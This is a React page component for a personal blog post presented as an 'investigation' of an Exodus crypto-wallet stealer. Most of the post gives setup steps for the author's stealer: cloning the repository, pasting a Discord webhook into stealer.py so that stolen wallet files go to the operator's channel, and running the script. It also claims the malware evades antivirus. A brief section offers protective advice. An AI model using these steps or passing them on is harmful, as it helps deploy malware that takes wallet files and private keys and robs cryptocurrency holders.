import { Divider, Card, Spacer, Grid, Badge, Button, Link, Row, Tooltip } from "@nextui-org/react";
import { BiArrowBack } from 'react-icons/bi'
import { FiArrowRight } from 'react-icons/fi'
import Router from 'next/router'

const bitcoin_clipper = () => {
  return (

    <>
        <head>
            <title>katsu.bio</title>
        </head>

        <Grid.Container css={{ display: "flex" }}>
            <Grid css={{ marginLeft: "auto", marginRight: "auto" }}>
                <h2 style={{ marginTop: "10%", fontSize: "30px" }}>Exodus Wallet Stealer Investigation</h2>
                
                <Row>
                    <p style={{ fontSize: "20px" }}><Link href="https://github.com/NotKatsu/" css={{ color: "#FFFFFF", marginRight: "3px" }}>Katsu</Link> / Mar 31, 2023</p>

                    <Tooltip content={"Dangerous Software"} hideArrow={true} placement="rightEnd" shadow={false} color={"error"}>
                        <Badge size="lg" color={"error"} css={{ borderRadius: "10px", marginLeft: "$5" }}>Malware</Badge>
                    </Tooltip>
                </Row>

                <Spacer y={1} />
                <img  style={{ borderRadius: "6px", width: "100%" }} src="https://media.discordapp.net/attachments/1090007244076228639/1091048102988886138/kenny-eliason-AOJGuIJkoBc-unsplash.jpg?width=687&height=458" />
                <Spacer y={1} />
                <Divider />
                <Spacer y={1} />

                <p style={{ fontSize: "19px" }}>Exodus is one of the biggest Crypto Wallets with millions of users, a new type of Malware is spreading</p>
                <p style={{ fontSize: "19px" }}>which allows Cybercrimals to get access to your money just by you installing a piece of software, this</p>
                <p style={{ fontSize: "19px" }}>undetectable type of Malware is loved by CyberCriminals as it allows them to gain access to your money</p>
                <p style={{ fontSize: "19px" }}>without triggering your Anti-Virus, this means the attacks can steal your crypto everytime you make a new</p>
                <p style={{ fontSize: "19px" }}>wallet without the .exe you installed getting deleted by Windows Anti-Virus or another Anti-Virus program.</p>

                <Spacer y={2} />
                <p style={{ fontSize: "19px" }}>In this post we will go over how to protect yourself against it and more importantly you can get hands on</p>
                <p style={{ fontSize: "19px" }}>and you can test this malware on your own PC without the risk of it actually stealing your private keys.</p>

                <Spacer y={2} />
                <p style={{ fontSize: "19px" }}>To get started first you need to install the required files from my Github, feel free to check, edit and remove</p>
                <p style={{ fontSize: "19px" }}>parts of code if you want to and know how to, to install the files to your desktop you can either manually install</p>
                <p style={{ fontSize: "19px" }}>the files or run the following command, for the following command to work ensure you have the Github CLI</p>
                <p style={{ fontSize: "19px" }}>program installed on your PC.</p>
                
                <Spacer y={1} />
                <Card variant="flat" css={{ bg: "#1f2124", width: "75%", borderRadius: "10px" }}>
                    <p style={{ fontSize: "19px", marginTop: "2%", marginBottom: "2%", marginLeft: "2%" }}>git clone <Link css={{ color: "#FFFFFF" }} href="https://github.com/NotKatsu/Exodus-Stealer">https://github.com/NotKatsu/Exodus-Stealer.git</Link></p>
                </Card>
            
                <Spacer y={2} />
                <p style={{ fontSize: "19px" }}>After installing the software there is a little setting up you have to do to make the stealer actually work, the</p>
                <p style={{ fontSize: "19px" }}>first this you have to do is create a Discord Webhook, you can do this by going to your Discord Server</p>
                <p style={{ fontSize: "19px" }}>you want the logs in then Edit Channel then Intergrations then Webhooks then click New Webhook and copy</p>
                <p style={{ fontSize: "19px" }}>the link, you can then open up stealer.py and paste the webhook where it says WEBHOOK as shown below.</p>

                <Spacer y={1} />
                <Card variant="flat" css={{ bg: "#1f2124", width: "75%", borderRadius: "10px" }}>
                    <p style={{ fontSize: "19px", marginTop: "2%", marginBottom: "2%", marginLeft: "2%" }}>Discord_Webhook_Client.send_file("WEBHOOK")</p>
                </Card>

                <Spacer y={2} />
                <p style={{ fontSize: "19px" }}>Once you do this it is as simple as running the Python file with the command below, you will need to paste</p>
                <p style={{ fontSize: "19px" }}>this command in a terminal in the same directory as the Python file so it runs.</p>
                
                <Spacer y={1} />
                <Card variant="flat" css={{ bg: "#1f2124", width: "75%", borderRadius: "10px" }}>
                    <p style={{ fontSize: "19px", marginTop: "2%", marginBottom: "2%", marginLeft: "2%" }}>python stealer.py or python3 stealer.py</p>
                </Card>

                <Spacer y={2} />
                <p style={{ fontSize: "19px" }}>Now we can go over how to protect this type of attack, this attack is not yet common but could be soon</p>
                <p style={{ fontSize: "19px" }}>CyberCriminal are figuring out ways to do this with other wallets too and since Crypto isn't like a bank</p>
                <p style={{ fontSize: "19px" }}>were you would be reimburst your money it makes it so you have to have extra security, I could go on about</p>
                <p style={{ fontSize: "19px" }}>how a good Anti-Virus MIGHT be able to catch this but it might not catch it all the time so right now i recommend</p>
                <p style={{ fontSize: "19px" }}>locking your Exodus wallet with a passport and don't save this password on your PC, this makes it harder for</p>
                <p style={{ fontSize: "19px" }}>CyberCriminals to get access to your wallet but this won't fully protect you, you could also find a Anti-Virus</p>
                <p style={{ fontSize: "19px" }}>which allows you to block access to certian folders by unknown applications, this will delete the file when it</p>
                <p style={{ fontSize: "19px" }}>tries to copy the files which will stop it in its tracks.</p>

                <Spacer y={1} />
                <Button css={{ bg: "transparent", fontSize: "19px", paddingLeft: "$0" }}  animated={false} auto onPress={() => Router.push('/posts')}><BiArrowBack style={{ marginRight: "5px" }}/>Back</Button>

                <Spacer y={0.5} />
                <Divider />
                <Spacer y={0.5} />
                <p style={{ fontSize: "18px", padding: "none" }}>© Katsu 2021 - 2023 😇</p>
                <Spacer y={1} />
            </Grid>
        </Grid.Container>
    </>

  )
}

export default bitcoin_clipper;